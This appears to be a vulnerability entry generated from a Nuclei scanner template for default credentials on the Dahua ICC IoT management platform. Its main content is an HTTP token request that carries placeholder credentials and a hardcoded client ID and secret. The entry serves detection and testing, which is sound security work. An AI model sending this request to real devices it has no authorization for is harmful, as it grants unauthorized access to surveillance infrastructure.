# Vulnerability: Dahua ICC Default Login
**Classification:** DAHUA
**Source:** Nuclei Template (`dahua-icc-default-login.yaml`)

## Description
Dahua ICC Intelligent IoT Integrated Management Platform contains default credentials. An attacker can authenticate to the platform using known default username and password combinations and obtain a valid access token.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /evo-apigw/evo-oauth/oauth/token HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

username={{username}}&password={{password}}&grant_type=password&client_id=web_client&client_secret=web_client&public_key=
```

